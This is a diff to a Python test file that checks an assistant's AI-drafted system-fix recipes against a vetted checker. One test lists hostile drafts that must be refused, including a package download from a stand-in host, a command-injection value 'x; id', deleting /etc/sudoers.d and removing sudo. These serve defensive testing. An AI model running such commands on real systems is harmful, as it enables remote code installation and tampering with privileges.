@@ -1,6 +1,7 @@
 """DecKoOS fixes (heal.py): an AI may only pick a vetted recipe and fill its blanks. Hostile blanks, unknown recipes
 and anything touching sudo, polkit, PAM, SSH, passwords or the firewall are refused, and the Assistant runs nothing
 the person declines."""
+import json
 import sys
 import unittest
 from pathlib import Path
@@ -95,6 +96,54 @@ class ReportTests(unittest.TestCase):
                          [('slow-boot', 3, 2), ('gpu-reset', 1, 1)])
         self.assertEqual(groups[0]['vendors'], {'amd': 2, 'nvidia': 1})
         self.assertEqual(groups[0]['issues'], [1, 2, 3])
+
+
+class DraftTests(unittest.TestCase):
+    GROUP = {'finding': 'unit:bluetooth', 'recipe': 'restart-system-service', 'reports': 9, 'worked': 8,
+             'vendors': {'amd': 5, 'nvidia': 4}, 'issues': [1]}
+
+    def draft(self, reply):
+        return heal_report.draft(self.GROUP, lambda _prompt: reply, save=False)
+
+    def test_the_library_passes_its_own_checker(self):
+        for rid, r in heal.RECIPES.items():
+            with self.subTest(recipe=rid):
+                self.assertTrue(heal.check_recipe(rid, r))
+
+    def test_a_good_draft_passes(self):
+        rid, r = self.draft('Here: {"id": "restart-bluetooth", "title": "Restart Bluetooth", "why": "It stopped",'
+                            ' "root": true, "params": {}, "steps": [["systemctl", "restart", "bluetooth.service"]]}')
+        self.assertEqual(rid, 'restart-bluetooth')
+        self.assertNotIn('restart-bluetooth', heal.RECIPES)  # drafts are never added by themselves
+
+    def test_an_existing_recipe_is_reused(self):
+        rid, r = self.draft('{"id": "restart-system-service", "title": "x", "why": "x", "root": true,'
+                            ' "params": {}, "steps": [["systemctl", "restart", "x"]]}')
+        self.assertIs(r, heal.RECIPES['restart-system-service'])
+
+    def test_malicious_or_sloppy_drafts_are_refused(self):
+        base = {"id": "bad-one", "title": "t", "why": "w", "root": True, "params": {}}
+        for steps, params in (
+                ([["bash", "-c", "id"]], {}),                                      # a program not on the list
+                ([["systemctl", "restart", "sshd.service"]], {}),                  # deny list
+                ([["pacman", "-U", "http://evil.example/x.pkg.tar.zst"]], {}),     # a download
+                ([["deckos", "undo", "--x={n}"]], {"n": ["int", 1, 5]}),           # a blank inside a word
+                ([["systemctl", "restart", "{unit}"]], {"unit": "anything"}),      # a free-text blank
+                ([["systemctl", "restart", "{unit}"]], {"unit": ["ok.service", "x; id"]}),  # a value that isn't plain
+                ([["find", "/etc/sudoers.d", "-delete"]], {}),                     # deny list
+                ([["pacman", "-R", "sudo"]], {}),                                  # pacman only installs
+                ([["systemctl", "mask", "bluetooth.service"]], {}),                # systemctl only starts things
+                ([["deckos", "kids", "remove", "mia"]], {}),                        # deckos: fix commands only
+                ([["systemctl"]] * 5, {})):                                        # too many steps
+            with self.subTest(steps=steps):
+                with self.assertRaises(heal.Refused):
+                    self.draft(json.dumps({**base, "steps": steps, "params": params}))
+
+    def test_no_fix_or_no_json(self):
+        with self.assertRaises(heal.Refused):
+            self.draft('{"none": "this needs a kernel patch"}')
+        with self.assertRaises(ValueError):
+            self.draft('I would restart it.')
 
 
 class AssistantTests(unittest.TestCase):
